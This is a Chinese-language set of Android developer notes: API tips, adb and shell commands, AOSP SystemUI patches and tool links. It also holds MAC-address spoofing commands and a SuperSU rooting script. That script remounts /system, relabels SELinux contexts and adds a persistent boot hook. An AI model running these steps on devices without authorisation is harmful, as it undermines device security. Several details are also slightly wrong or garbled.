AtomicFile——通过使用备份文件进行文件的原子化操作。这个知识点之前我也写过，不过最好还是有出一个官方的版本比较好。

ViewDragHelper ——视图拖动是一个比较复杂的问题。这个类可以帮助解决不少问题。如果你需要一个例子，DrawerLayout就是利用它实现扫滑。Flavient Laurent 还写了一些关于这方面的优秀文章。
PopupWindow——Android到处都在使用PopupWindow ，甚至你都没有意识到（标题导航条ActionBar，自动补全AutoComplete，编辑框错误提醒Edittext Errors）。这个类是创建浮层内容的主要方法。
Actionbar.getThemeContext()——导航栏的主题化是很复杂的（不同于Activity其他部分的主题化）。你可以得到一个上下文（Context），用这个上下文创建的自定义组件可以得到正确的主题。
ThumbnailUtils——帮助创建缩略图。通常我都是用现有的图片加载库（比如，Picasso 或者 Volley），不过这个ThumbnaiUtils可以创建视频缩略图。译者注：该API从V8才开始支持。
Context.getExternalFilesDir()———— 申请了SD卡写权限后，你可以在SD的任何地方写数据，把你的数据写在设计好的合适位置会更加有礼貌。这样数据可以及时被清理，也会有更好的用户体验。此外，Android 4.0 Kitkat中在这个文件夹下写数据是不需要权限的，每个用户有自己的独立的数据存储路径。译者注：该API从V8才开始支持。
SparseArray——Map的高效优化版本。推荐了解姐妹类SparseBooleanArray、SparseIntArray和SparseLongArray。
PackageManager.setComponentEnabledSetting()——可以用来启动或者禁用程序清单中的组件。对于关闭不需要的功能组件是非常赞的，比如关掉一个当前不用的广播接收器。
SQLiteDatabase.yieldIfContendedSafely()——让你暂时停止一个数据库事务， 这样你可以就不会占用太多的系统资源。
Environment.getExternalStoragePublicDirectory()——还是那句话，用户期望在SD卡上得到统一的用户体验。用这个方法可以获得在用户设备上放置指定类型文件（音乐、图片等）的正确目录。
View.generateViewId()——每次我都想要推荐动态生成控件的ID。需要注意的是，不要和已经存在的控件ID或者其他已经生成的控件ID重复。
ActivityManager.clearApplicationUserData()—— 一键清理你的app产生的用户数据，可能是做用户退出登录功能，有史以来最简单的方式了。
Context.createConfigurationContext() ——自定义你的配置环境信息。我通常会遇到这样的问题：强制让一部分显示在某个特定的环境下（倒不是我一直这样瞎整，说来话长，你很难理解）。用这个实现起来可以稍微简单一点。
ActivityOptions ——方便的定义两个Activity切换的动画。 使用ActivityOptionsCompat 可以很好解决旧版本的兼容问题。
AdapterViewFlipper.fyiWillBeAdvancedByHostKThx()——仅仅因为很好玩，没有其他原因。在整个安卓开源项目中（AOSP the Android open Source Project Android开放源代码项目）中还有其他很有意思的东西（比如 GRAVITY_DEATH_STAR_I）。不过，都不像这个这样，这个确实有用
ViewParent.requestDisallowInterceptTouchEvent() ——Android系统触摸事件机制大多时候能够默认处理，不过有时候你需要使用这个方法来剥夺父级控件的控制权。

1、android:clipChildren 和 android:clipToPadding：clipToPadding就是说控件的绘制区域是否在padding里面的，true的情况下如果你设置了padding那么绘制的区域就往里 缩，clipChildren是指子控件是否超过padding区域，这两个属性默认是true的，所以在设置了padding情况下，默认滚动是在 padding内部的，要达到上面的效果主要把这两个属性设置了false那么这样子控件就能画到padding的区域了。使用场景如：ActionBar（透明）下显示Listview而第一项要在actionbar下。参见 android:clipToPadding和android:clipChildren。
2、Fragment 的 setUserVisibleHint 方法，可实现 fragment 对用户可见时才加载资源（延迟加载）。
3、自定义 View 时重写 hasOverlappingRendering 方法指定 View 是否有 Overlapping 的情况，提高渲染性能。
4、AutoScrollHelper，在可滚动视图中长按边缘实现滚动，Android View.OnTouchListener 的子类。
5、TouchSlop，系统所能识别出的被认为是最小的滑动距离，ViewConfiguration.get(context).getScaledTouchSlop()。
6、VelocityTracker，可用于 View 滑动事件速度跟踪。
7、AlphabetIndexer，字母索引辅助类。
9、ArrayMap，比 HashMap 更高的内存效率，但比 HashMap 慢，不适合有大量数据的场景。
10、Property，抽象类，封装出对象中的一个易变的属性值，使用场景如在使用属性动画时对动画属性的操作。
11、SortedList，v7 包中，见名知意。

一直以为 Lollipop Dialer 接通画面里面那些酷炫的动画（文字部分）是很复杂的做出来的，后来发现其实只有一行。 只需要加好 android:animateLayoutChanges="true" 然后 setVisibility 就可以了

TimingLogger,SDK自带打印时间戳工具，简直神器。

1.通过 WindowManager.addView 在其他app界面添加一个view时，经常会无法显示，特别在miui，emui固件上，需要指定type为LayoutParams.TYPE_TOAST。

2.View.getLocationOnScreen(new int[] )，获取view在屏幕上的位置

3.Paint.setXfermode(porterDuffXfermode)，在ApiDemo里面有专门的介绍，实现了穿透，叠加，覆盖等多种绘制效果，非常实用

4.直接获取当前系统壁纸的fd
IBinder binder = ServiceManager.getService("wallpaper");
IWallpaperManager wm = IWallpaperManager.Stub.asInterface(binder);
Bundle params = new Bundle();
ParcelFileDescriptor fd = wm.getWallpaper(stub, params);
直接获取当前系统壁纸的fd，避免壁纸过大造成oom问题。这种方式有适配问题，需注意。

5.通过View.getDrawingCache()可以获取截图，但是需要setDrawingCacheEnabled(true)频繁使用可能会oom，还有一种方法直接用canvas
Bitmap bm = Bitmap.createBitmap((int) (w * scale), (int) (h*scale), Bitmap.Config.ARGB_8888);
Canvas canvas = new Canvas();
canvas.setBitmap(bm);
View.draw(canvas);
return bm；

6.说到几个oom，顺带说下有一种偷懒又有效的解决办法，在manifest上加android:largeHeap="true"

7.用一个牛逼的来结尾，AccessibilityService。由于强大所以需要手动

1、android.support.design.widget.TextInputLayout，给EditText带个套吧⊙▽⊙
4、Parcelable接口 原来受MFC等c++类库影响，比较习惯继承serialiabe接口这种方式，但后来知道了Parcelable的实现方式就喜欢上了。
5、android.support.v4.widget.DrawerLayout 原生大方的抽屉控件。
6、android.support.v7.widget.Toolbar 定制性极强的viewGroup

再补充一个监听主线程是否空闲，在View丢帧的情况下使用，效果立竿见影，在主线程中

Looper.myQueue().addIdleHandler(mIdleHandler)

ArgbEvaluator.evaluate(float fraction, Object startValue, Object endValue);根据一个起始颜色值和一个结束颜色值以及一个偏移量生成一个新的颜色，分分钟实现类似于微信底部栏滑动颜色渐变。
这里提供另一个颜色渐变的版本 From Google Sample SlidingTabsColors下的 SlidingTabStrip.java

BaseQuickAdapter
TextUtils.join
```

## 值得借鉴的点击两次退出应用的实现，直接用toast的getView().getParent()

```text
public class MainActivity extends Activity {
    private Toast toast;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        toast = Toast.makeText(getApplicationContext(), "确定退出？", 0);
    }
    public void onBackPressed() {
        quitToast();
    }
    private void quitToast() {
        if(null == toast.getView().getParent()){
            toast.show();
        }else{
            System.exit(0);
        }
    }
}
```

## [知识点] 硬件加速

```text
硬件加速是指在计算机中通过把计算量非常大的工作分配给专门的硬件来处理以减轻中央处理器的工作量之技术。尤其是在图像处理中这个技术经常被使用。
```

## [CMD] 进入 recovery 的另一种命令

```text
adb shell service call recovery 4 s16 foo

interface IRecoverySystem {
    boolean uncrypt(in String packageFile, IRecoverySystemProgressListener listener);
    boolean setupBcb(in String command);
    boolean clearBcb();
    void rebootRecoveryWithCommand(in String command);
    boolean requestLskf(in String updateToken, in IntentSender sender);
    boolean clearLskf();
    boolean rebootWithLskf(in String updateToken, in String reason);
}
```

## [知识点] mipmap

```text
mipmap 是一种很早就有的技术了，翻译过来就是纹理映射技术.

google建议只把启动图片放入。
```

## doze 白名单

```text
frameworks/base/data/etc/platform.xml

<allow-in-power-save package="com.android.cellbroadcastreceiver" />
<allow-in-power-save package="com.android.shell" />
```

## debug.layout

```text
system/libsysprop/srcs/android/sysprop/DisplayProperties.sysprop

# When set to true, apps will draw debugging information about their layouts.
prop {
    api_name: "debug_layout"
    type: Boolean
    scope: Internal
    access: ReadWrite
    prop_name: "debug.layout"
}

adb shell setprop debug.layout true && adb shell am start -a "android.settings.APPLICATION_DEVELOPMENT_SETTINGS" && sleep 1 && kk com.android.settings

adb shell setprop debug.layout false && adb shell am start -a "android.settings.APPLICATION_DEVELOPMENT_SETTINGS" && sleep 1 && kk com.android.settings
```

## android 音频调试工具tinyalsa简介

```text
Android 系统集成了简化版本的 ALSA （Advanced Linux Sound Architecture），包括：tinymix，tinypcminfo，tinycap，tinyplay 四个常用的指令。

编译与集成：
在android系统编译环境中输入 mmm external/tinyalsa/，即可在system/bin下面找到tiny 系列的二进制文件，若需要在系统编译时候就集成此功能，可修改对应的项目的mk文件，增加如下内容：

PRODUCT_PACKAGES += \
    tinycap \
    tinymix \
    tinyplay \
    tinypcminfo
注意：编译集成是，package要用最后生成的文件名字，不能使用文件夹的名字。

适用范围：
tinycap 用来简单录音，通常用来测试录音，参数如下：

tinycap file.wav [-D card]  [-d device]  [-c channels]  [-r rate]  [-b bits]  [-p period_size]  [-n n_periods]  [-T capture time] 

一般在录音前需要用tinymix的配置好录音的参数。

tinymix 用来配置音频参数，通常输入tinymix ，可以看到当前声卡的信息如下：

tinyplay 是一个简易的音乐播放器，一般用于播放测试。tinyplay只能播放wav原始格式的音乐，不能进行Mp3等格式的解码，支持44.1kHz，48kHz采样率的wav音乐。在调用tinyplay播放音乐之前需要先使用tinymix切换好音频通路。

tinypcminfo 用于查看pcm通道的相关信息
```

## [CMD] procstats内存分析工具

```text
输出3小时的统计数据
adb shell dumpsys procstats --hours 3

meminfo 是显示当前内存的使用情况，android进行了改进，可以执行 adb shell dumpsys meminfo，输出当前的内存数据，具体见下图：

说明：
1. procstats 百分比表示应用运行时间的百分比，后面的数字输出应用的运行时的 PSS、USS数据，包括最小值、平均值、最大值。
2. procstats 输出统计数据，meminfo输出实时数据，可以作为当前内存情况的双向参考。
3. procstats 数据可在 Settings > Developer options > Process stats 中访问此选项。
```

## Android adb 串口设备调试方法

```text
在目前android设备调试过程中，经常有客户需要用外挂串口设备，但是在后期联调时，由于环境因素，自己调试时不知道如何进行。因此下面就windows环境下android设备使用adb调试外挂串口设备调试的要求和步骤记录如下：

windows机器安装adb

请参考：windows系统下adb的安装及找不到设备时的修改方法。 安装好adb shell环境。

查看系统usb 串口设备是否正常挂载

在cmd 菜单输入adb shell ，然后输入如下指令查看ttyUSB设备是够挂载。

ls -al /dev/ttyUSB*
若能正常显示你需要打开的串口，则证明设备已挂载正常。

usb串口输出

打开一个adb窗口，输入如下指令，等待输入

cat /dev/ttyS0
usb串口输入

重新打开一个窗口若系统的busybox带有microcom ，可以按照如下方式打开，进行串口通信：

busybox microcom -t 15000 -s 115200 /dev/ttyS0
若系统未集成micocom，按照如下方式进行：

echo -e "AT\r\n" /dev/ttyS0
注：以下操作都在进入adb shell 后进行。

特殊说明：

输入和输出都在进入adb shell串口界面后进行，且需要打开2个adb shell的窗口。
可在前期调试将串口的RX,TX脚短路，形成回路，可发现收发数据一致，表示串口工作正常。
usb转串口需要系统支持，需要打开系统的usb转串口功能，不然不能在dev目录找到对应的设备。
```

## MTK 平台如何在 user 版本打开串口打印信息

```text
串口打印作为常用的调试方法，在解决系统死机和各种设备问题时十分有效，通常是在eng版本的时候才有完整的打印信息，若是在量产阶段或者 user 版本时没有串口通常无法有效分析问题。
因此，在user版本中打开打印，作为分析问题的方法十分有效，下面记录一下 MTK 平台在 user 版本打开串口打印信息的2种方法：

1. 使用 eng 版本的lk文件替换掉 user 版本的此文件，升级此lk文件即可。

2. 修改 vendor/*/bootable/bootloader/lk/app/mt_boot/mt_boot.c 中 printk.disable_uart=1 为 printk.disable_uart=0，然后重新编译lk文件，升级即可。

通常情况下，串口打印会在打印如下信息停止打印：

[   25.986567] .(1)[324:Binder_1]  [usktrk]  socket close[10422]  
[   25.987748] .(1)[324:Binder_1] BOOTPROF:     25987.740155:BOOT_Animation:END
[   25.988616] .(1)[324:Binder_1] << printk console disable >>
可以采用如下的3种方法再次打开打印：

1. 在连接好 tx 和 rx 的串口终端中输入 回车键
2. 通过 adb 输入：

adb shell echo 1 > /proc/mtprintk
3. 通过修改Property的方式：

adb shell setprop persist.uartconsole.enable 1
此方法重启后仍然生效。

注：串口可以输入的也可以在串口输入：

setprop persist.uartconsole.enable 1
```

## 如何修改 Linux / Android 系统的MAC地址

```text
MAC 地址做为网络设备的唯一ID，需要到RA去购买，具体见另两篇博文：

移动设备常见串号简介：MAC地址
MAC地址简介及购买价格

但是在实际使用过程，我们需要去临时修改 MAC 地址，特别是在 Linux 和 Android系统中，我们要如何做呢？

首先是查看：我们在Linux 和 Android 下面如何查看 MAC 地址，具体代码如下：

Linux -- 在终端输入：

$ ifconfig
or

$ ifconfig -a | awk '/HWaddr/ {print "Interface: " $1 "\t MAC: " $NF}'
Android --在adb shell 输出界面输入（需要 root 权限和安装busybox）：

# busybox ifconfig
在输出的详细信息里面查看 MAC 地址：

然后修改指令：
Linux ：

$ sudo ifconfig eth0 down
$ sudo ifconfig eth0 hw ether 80:00:00:00:00:01
$ sudo ifconfig eth0 up
Android：

Ethernet 
# busybox ifconfig eth0 down
# busybox ifconfig eth0 hw ether 80:00:00:00:00:01
# busybox ifconfig eth0 up
or

WLan
# busybox ifconfig wlan0 down
# busybox ifconfig wlan0 hw ether 80:00:00:00:00:01
# busybox ifconfig wlan0 up
修改完毕，按照上述的第一条的检查就会发现MAC地址已被修改掉。

最后是注意事项，以下为常见错误及原因：

1. 重启计算机后MAC地址会被还原成原始值。
2. 提示" SIOCSIFHWADDR: Operation not permitted "，表示没有权限，需要 root 用户才能执行。
3. 提示" SIOCSIFHWADDR: Device or resource busy - you may need to down the interface ",表示网络设备正在运行需要关闭网络设备才能继续执行
4. 提示" SIOCSIFHWADDR: Cannot assign requested address " 表示MAC地址不符合规则，需要用标准的MAC地址。
```

## [知识点] 移动设备常见串号简介：MAC地址

```text
MAC地址是设备的在网络上的标识ID，如同IMEI做为移动通信的唯一ID一样，都是具有全球唯一性的设备ID，其应用广泛，几乎所有的可联网的设备都有MAC地址，下面简单介绍其含义，组成及查看方法。

MAC地址的含义：

MAC 地址采用十六进制数表示，共六个字节（48位）。分为2个部分，具体如下：

前三个字节是由IEEE的注册管理机构RA负责给不同厂家分配的代码(高位24位），也称为“编制上唯一的标识符”（Organizationally Unique Identifier），
后三个字节(低位24位)由各厂家自行指派给生产的适配器接口，称为扩展标识符（唯一性）。
注：其中第1字节的第8 bit 标识这个地址是组播地址还是单播地址。

MAC地址查看方法

WINDOWS设备，在cmd的中输入ipconfig /all，就可以看到该设备的MAC地址。

Linux设备，在终端输入 ifconfig ，就可以看到该设备的MAC地址。

Android设备，在wifi 或者蓝牙设备的高级菜单或者设置的状态界面可以看到。
```

## 常用的shell指令

```text
1. 查看文件夹的占用：
du -h --max-depth=1 ./

2. 查看MD5校验值是否正常。
md5sum -c xx.md5

3. 带路径的拷贝
tar -cpf - build/core/Makefile | (cd ../gms/; tar -xpf -)

4. 查找空文件夹并增加文件。
find . -type d -empty -exec touch {}/.gitkeep \;

5. 查找文件并删除指定文件。
find ./ -name ".gitignore" -exec rm -rf {} \;

6. 重新挂载路径为读写。
mount -o remount rw  /xxx/xxx

7.tar说明
tar  [主选项+辅选项]   压缩文件名 路径    # 压缩时
tar [主选项+辅选项]  压缩文件名 -C 路径  #解压时，-C及路径不写时，解压到本地文件夹。
tar -jxvf  xxx.tar.bz2  #解压bz2
tar -zxvf  xxxx.tar.gz #解压gz
注：tar的常见参数含义：-x 释放文件，-c 打包文件，-z 使用zip方式压缩，-v 显示信息，-j bz2文件

8. 随机密码，命令使用SHA来哈希日期，输出头32个字节
date +%s | sha256sum | base64 | head -c 32 ; echo  
9. 拷贝远程的文件到本地和拷贝本地文件到远程文件夹

# 拷贝本地的文件到远程  
scp -r local_file remote_username@remote_ip:remote_folder    
# 拷贝远程的文件到本地    
scp -r remote_username@remote_ip:remote_folder local_file    

10. shell脚本中echo显示内容带颜色方法
```

## Android Linux Kernel

```text
Android内核是在标准Linux内核的基础上修改而成。 为了适应嵌入式硬件环境和移动应用程序的开发，Android 对标准Linux内核进行了一定的修改，主要包括以下内容，下面会针对其中英文名称对照，主要内容和代码所在位置，进行分别说明：

Android Binder机制

中文：Android Binder
英文：Android Binder机制
主要内容说明：基于open binder框架的一个驱动，用于提供Android平台的进程间通信(IPC)。
源代码位置：drivers/staging/android/binder.c
Android 电源管理

中文：Android 电源管理
英文：Android Power Management(PM)
主要内容说明：基于Linux电源管理系统的轻量级的电源管理模块。
源代码位置：kernel/power/
低内存管理

中文：低内存管理
英文：Low Memory Killer
主要内容说明：更灵活的内存管理，可根据需要杀死进程。其关键函数为lowmem_shrinker。
源代码位置：drivers/staging/android/lowmemorykiller.c
匿名内存共享

中文：匿名内存共享
英文：Ashmem(Anonymous Shared Memory)
主要内容说明：为进程提供大块内存共享，同时为内核提供回收和管理内存的机制。如果一个程序尝试访问kernel释放的一个共享内存块，它将收到错误提示，然后重新分配内存并重载。
源代码位置：mm/ashmem.c
Android 日志

中文：Android 日志
英文：Android Logger
主要内容说明：轻量级的日志设备。
源代码位置：drivers/staging/android/logger.c
Android 闹钟

中文：Android 闹钟
英文：Android Alarm
主要内容说明：提供一个定时器，用于设备从睡眠状态唤醒，同时它提供设备睡眠时运行的基准时钟。
源代码位置：
drivers/rtc/rtc-core
drivers/rtc/rtc-dev.c
USB Gadget驱动

中文：USB Gadget驱动
英文：USB Gadget
主要内容说明：一个具有标准Linux USB gadget驱动框架的设备驱动。
源代码位置：
drivers/usb/gadget/android.c
drivers/usb/gadget/f_adb.c
drivers/usb/gadget/f_mass_storage.c
Android Ram Console

中文：Android 内存控制台
英文：Android Ram Console
主要内容说明：为了提供调试功能，Android允许将调试日志信息写入一个被称为RAM Console的设备里，它是一个基于RAM的Buffer。
源代码位置：drviers/staging/android/ram_console.c
Android 时间设备

中文：Android 时间设备
英文：Android Timed Device
主要内容说明：提供了对设备进行定时控制功能，目前仅仅支持vibrator和LED设备。
源代码位置：
drviers/staging/adnroid/timed_output.c
drviers/staging/adnroid/timed_gpio.c
Yaffs2文件系统

中文：Yaffs2文件系统
英文：Yet Another Flash File System 2
主要内容说明：在Android系统中，采用Yaffs2作为MTD NAND FLASH文件系统。Yaffs2是一个快速稳定的应用于NAND和NOR FLash的跨平台的嵌入式设备文件性，同其他Flash文件系统相比，Yaffs2使用更小的内存来保存运行状态，因此它占用内存小；Yaffs2的垃圾回收非常简单而且快速，因此能够达到更好的性能；
源代码位置：fs/yaffs2/
```

## Android R状态栏显示蓝牙图标

```text
Android R上开启蓝牙后，状态栏上并不会直接显示蓝牙图标的。只有在蓝牙连接传输的时候才会有蓝牙图标显示。
原生实现是在PhoneStatusBarPolicy.java中：
    private final void updateBluetooth() {
        ......
        if (mBluetooth != null) {
            if (mBluetooth.isBluetoothConnected()
                    && (mBluetooth.isBluetoothAudioActive()
                    || !mBluetooth.isBluetoothAudioProfileOnly())) {
                contentDescription = mResources.getString(
                        R.string.accessibility_bluetooth_connected);
                bluetoothVisible = mBluetooth.isBluetoothEnabled();
            }
        }
        ......
    }
解决方案：
将bluetoothVisible赋值的条件设置为bluetooth enable。
         boolean bluetoothVisible = false;
         if (mBluetooth != null) {
+            if(mBluetooth.isBluetoothEnabled()){
+               bluetoothVisible = mBluetooth.isBluetoothEnabled();
+            }
             if (mBluetooth.isBluetoothConnected()
                     && (mBluetooth.isBluetoothAudioActive()
                     || !mBluetooth.isBluetoothAudioProfileOnly())) {
                 contentDescription = mResources.getString(
                         R.string.accessibility_bluetooth_connected);
-                bluetoothVisible = mBluetooth.isBluetoothEnabled();
+                //bluetoothVisible = mBluetooth.isBluetoothEnabled();
             }
```

## Android R锁屏/状态AM.PM显示

```text
Android R锁屏/状态AM.PM显示
原因：
原生默认在12小时制下是显示h:mm的。状态栏上时间显示是在Clock.java中，在构造函数中会初始化mAmPmStyle，可以看到默认是为AM_PM_STYLE_GONE，即不显示AM/PM的。
public Clock(Context context, AttributeSet attrs, int defStyle) {
    ......
    try {
        mSystemUIFactoryBase = OpSystemUICustomizationFactoryBase.getOpFactory(context);
        mStatusBarExt = mSystemUIFactoryBase.makeSystemUIStatusBar(context);
        mAmPmStyle = mStatusBarExt.getClockAmPmStyle(a.getInt(R.styleable.Clock_amPmStyle,
                AM_PM_STYLE_NORMAL));
        mShowDark = a.getBoolean(R.styleable.Clock_showDark, true);
        mNonAdaptedColor = getCurrentTextColor();
    }
    .....
}
这里需要考虑到锁屏下的时间制式显示；锁屏上的时间显示是在KeyguardStatusView.java中，在其内部的Patterns类update方法中，会去判断12小时显示，然后替换字串为空。

private static final class Patterns {
    ......
    static void update(Context context) {
        .....
        clockView12 = DateFormat.getBestDateTimePattern(locale, clockView12Skel);
        // CLDR insists on adding an AM/PM indicator even though it wasn't in the skeleton
        // format.  The following code removes the AM/PM indicator if we didn't want it.
        if (!clockView12Skel.contains("a")) {
            clockView12 = clockView12.replaceAll("a", "").trim();
        }
        clockView24 = DateFormat.getBestDateTimePattern(locale, clockView24Skel);
        ......
    }
    ......
}
同时，需要将"keyguard_widget_12_hours_format"的样式进行修改，默认是h:mm
<!-- Time format strings for fall-back clock widget -->
<string name="keyguard_widget_12_hours_format" translatable="false">h:mm</string>
解决方案：
将默认值替换成AM_PM_STYLE_NORMAL即可：
             mAmPmStyle = mStatusBarExt.getClockAmPmStyle(a.getInt(R.styleable.Clock_amPmStyle,
-                    AM_PM_STYLE_GONE));
+                    AM_PM_STYLE_NORMAL));
             mShowDark = a.getBoolean(R.styleable.Clock_showDark, true);
将字串替换的地方注释掉：
             clockView12 = DateFormat.getBestDateTimePattern(locale, clockView12Skel);
             // CLDR insists on adding an AM/PM indicator even though it wasn't in the skeleton
             // format.  The following code removes the AM/PM indicator if we didn't want it.
-            if (!clockView12Skel.contains("a")) {
-                clockView12 = clockView12.replaceAll("a", "").trim();
-            }
+            //if (!clockView12Skel.contains("a")) {
+            //    clockView12 = clockView12.replaceAll("a", "").trim();
+            //}

             clockView24 = DateFormat.getBestDateTimePattern(locale, clockView24Skel);
将12小时制式更改：
     <!-- Time format strings for fall-back clock widget -->
-    <string name="keyguard_widget_12_hours_format" translatable="false">h:mm</string>
+    <string name="keyguard_widget_12_hours_format" translatable="false">aa</string>
```

## Android R下拉通知栏图标背景色更改

```text
下拉通知栏的图标背景色设置是在QSTileBaseView.java中
mColorActive = Utils.getColorAttrDefaultColor(context, android.R.attr.colorAccent);
对应的colorAccent是在colors_material.xml，中定义的，颜色值是#ff008577
<color name="accent_material_light">@color/material_deep_teal_500</color>        <!-- light模式下的高亮色 -->    <!--<color name="material_deep_teal_500">#ff008577</color> -->    <color name="material_deep_teal_500">#ff256FFF</color>
解决方案：
1.不建议直接修改colors_material.xml中的颜色值，因为其他的地方也会调用到这个高亮色的，同时这么修改会导致CTS failed的；
2.修改SystemUI中直接调用的地方：
+        //mColorActive = Utils.getColorAttrDefaultColor(context, android.R.attr.colorAccent);+        mColorActive = context.getResources().getColor(R.color.colorAccent);
接着在SystemUI的color.xml中给这个colorAccent定义需要的背景色值：
+        <color name="colorAccent">#FF1A73E8</color>
```

## DevKnox

```text
DevKnox 是用于创建安全android应用程序的最漂亮的工具。应用程序内部隐藏了许多安全漏洞，开发人员甚至都不知道这些安全漏洞，因此，在获得足以捕获这些缺陷的安全性的各个关键方面之前，需要花费大量的实践和精力。.

但是，这个出色的工具可以帮助您检测安全漏洞，并且其功能与IDE中的拼写检查器一样易于操作。它提供实时测试，漏洞跟踪，实时测试，并具有交互式仪表板.
```

## Xamarin

```text
Xamarin 是用于构建出色的本机应用程序的跨平台开发工具。它在程序之间重用业务逻辑层和数据访问。不仅是Android，而且您还可以借助Xamarin开发iOS和Windows应用程序。以下是它的一些好处.

它是一个单声道框架，支持与移动设备的API进行联系
Xamarin组件存储包括UI控件，跨平台库和第三方库
从而减少了错误，因此加快了开发速度
它提供应用程序索引编制和深层链接
允许仅在特定平台上才能使用的消费功能
有一个梦幻般的 Udemy课程，学习Xamarin.
https://www.udemy.com/course/complete-xamarin-developer-course-ios-and-android/?ranMID=39197&ranEAID=jf7w44yEft4&ranSiteID=jf7w44yEft4-_P0zPcBkT1gS2A1WTwsUDg&LSNPUBID=jf7w44yEft4&utm_source=aff-campaign&utm_medium=udemyads
```

## GameMaker Studio

```text
对于Android游戏开发者而言，最杰出的开发工具之一是 GameMaker Studio. GameMaker使用很少的代码即可提供制作2D游戏所需的一切。它是一个极其用户友好的应用程序，具有流畅的拖放界面.

GameMaker负责创建跨平台和多类型的视频游戏，这些游戏运行自定义的拖放式可视编程语言或称为GameMaker Language的书写语言。最初创建它是为了使新手计算机程序员无需太多编程知识即可准备制作计算机游戏。.
```

## Action Game Maker

```text
```

## Takt

```text
Takt是一个用于检查app FPS的小巧工具。
https://github.com/wasabeef/Takt
```

## ADB IDEA

```text
https://github.com/pbreault/adb-idea
一个开源的Android Studio插件，帮助你在IDE中实现app重启，杀死，清理数据，卸载
```

## 一款开源的 Android YUV 格式查看工具

```text
1. YUVDroidTools
最近项目比较忙，好久没有写文章了，也没有为开源社区贡献点啥了，这个周末抽空整理了一下自己一直维护的一份基于 ffmpeg 的 YUV 格式转换代码，写了一个简单的 Android YUV 数据查看工具（代码完全开源），截图如下：

特性如下：
（1）支持选择导入本地文件，支持实时显示 YUV 格式的图片，简单易用。
（2）支持多种 YUV 格式，包括： YU12、YV12、NV21、NV12、YUYV422、YVYU422、YUV422P、UYVY422 等等。
（3）支持多种图像转化算法，包括： FAST_BILINEAR、BILINEAR、BICUBIC 等等。

2. 常见的 YUV 格式示意图
顺便科普一下常见的 YUV 格式的排列示意图：

2.1 YUV420 
(1) YU12, I420
YYYY YYYY UU VV

(2) YV12 
YYYY YYYY VV UU

(3) NV12
YYYY YYYY UV UV

(4) NV21
YYYY YYYY VU VU

2.2 YUV422
(1) YUYV, YUY2
YUYV YUYV YUYV YUYV

(2) UYVY
UYVY UYVY UYVY UYVY

(3) YUV422P
YYYY YYYY UUUU VVVV

3. 本项目的源码
本 APP 的源码地址如下：https://github.com/Jhuster/YUVDroidTools，各种常见的 YUV 格式的文件我也放了一份在这个项目的 testfiles 文件夹下面，方便大家做测试。

源码中提供了一个 YUV 格式转换类 FFConverter，可以方便大家集成到自己的项目中使用，其接口定义如下：
```

## TODO : 学习 Android Kernel 开发？gdb？

## [CMD] 通过adb播放开关机动画

```text
通过adb播放开机动画
1：adb shell setprop service.bootanim.exit 0
2：adb shell setprop ctl.start bootanim

结束播放开机动画
1：adb shell setprop ctl.stop bootanim
2：adb shell setprop service.bootanim.exit 1
```

## [CMD] adb+.sh

```text
#!/bin/bash
# Script adb+
# Usage
# You can run any command adb provides on all your currently connected devices
# ./adb+ <command> is the equivalent of ./adb -s <serial number> <command>
#
# Examples
# ./adb+ version
# ./adb+ install apidemo.apk
# ./adb+ uninstall com.example.android.apis
# study from here >>> http://engineering.meetme.com/2014/07/quick-tip-how-to-install-or-uninstall-apks-on-multiple-android-devices-with-just-one-command/
adb devices | while read line
do
    if [[( `echo $line | awk '{print $2}'` = "device" ) ] ] 
    then
        device=`echo $line | awk '{print $1}'`
        echo "adb -s $device $@ ..."
        adb -s $device $@
    fi
done
```

## [CMD] adb-wrapper

```text
#!/bin/bash

#study from here! pretty tool
#http://mitsnosrap.wordpress.com/2013/01/25/android-wrapper-for-adb/

# This is a wrapper for adb.  If there are multiple devices / emulators, this script will prompt for which device to use
# Then it'll pass whatever commands to that specific device or emulator.

# Run adb devices once, in event adb hasn't been started yet
BLAH=$(adb devices)

# Grab the IDs of all the connected devices / emulators
IDS=($(adb devices | sed '1,1d' | sed '$d' | cut -f 1 | sort))
NUMIDS=${#IDS[@] }

# Check for number of connected devices / emulators
if [[ 0 -eq "$NUMIDS" ] ] ; then
    # No IDs, exit
    echo "No emulators or devices detected - nothing to do."
    exit 0;
elif [[ 1 -eq "$NUMIDS" ] ] ; then
    # Just one device / emulator
    adb $@
    exit 0;
fi

# If we got here, there are multiple devices, need to get information then prompt user for which device/emulator to uninstall from

# Grab the model name for each device / emulator
declare -a MODEL_NAMES
for (( x=0; x < $NUMIDS; x++ )); do
    MODEL_NAMES[x] =$(adb devices | grep ${IDS[$x] } | cut -f 1 | xargs -I $ adb -s $ shell cat /system/build.prop | grep "ro.product.model" | cut -d "=" -f 2 | tr -d ' \r\t\n')
done

# Grab the platform version for each device / emulator
declare -a PLATFORM_VERSIONS
for (( x=0; x < $NUMIDS; x++ )); do
    PLATFORM_VERSIONS[x] =$(adb devices | grep ${IDS[$x] } | cut -f 1 | xargs -I $ adb -s $ shell cat /system/build.prop | grep "ro.build.version.release" | cut -d "=" -f 2 | tr -d ' \r\t\n')
done

echo "Multiple devices detected, please select one"
for (( x=0; x < $NUMIDS; x++ )); do
    echo -e "$[x+1] : ${IDS[x] }\t\t${PLATFORM_VERSIONS[x] }\t\t${MODEL_NAMES[x] }"
done
echo -n "> "
read USER_CHOICE

# Validate user entered a number
if [[ $USER_CHOICE =~ ^[0-9] +$ ] ] ; then
    echo "executing following command:"
    echo "    adb -s ${IDS[$USER_CHOICE-1] } $@"
    adb -s ${IDS[$USER_CHOICE-1] } $@
else
    echo "You must enter a number"
fi
```

## SuperSU root替换工程boot自带root权限

```text
测试机型：三星S7 G930P 安卓 7.0

1.首先我们可以新建一个root.bat批处理文件，内容如下：

adb wait-for-device
adb shell mount -o rw,remount /system
adb shell mount -o rw,remount rootfs /
adb push su.img /data/su.img
adb push launch_daemonsu.sh /system/etc/launch_daemonsu.sh
adb install -r SuperSU-v2.82.apk
adb shell < supersu.cmds
2.然后准备一个shell脚本，名字叫supersu.cmds：

touch /system/xbin/su
chmod 0755 /system/xbin/su
chcon u:object_r:system_file:s0 /system/xbin/su

chmod 0700 /system/etc/launch_daemonsu.sh
chcon u:object_r:su_exec:s0 /system/etc/launch_daemonsu.sh
if [ `cat /system/etc/init.sec.boot.sh | grep daemonsu >/dev/null 2>&1; echo $?` -ne 0 ] ; then
    echo '/system/etc/launch_daemonsu.sh' >> /system/etc/init.sec.boot.sh
fi

sync
reboot
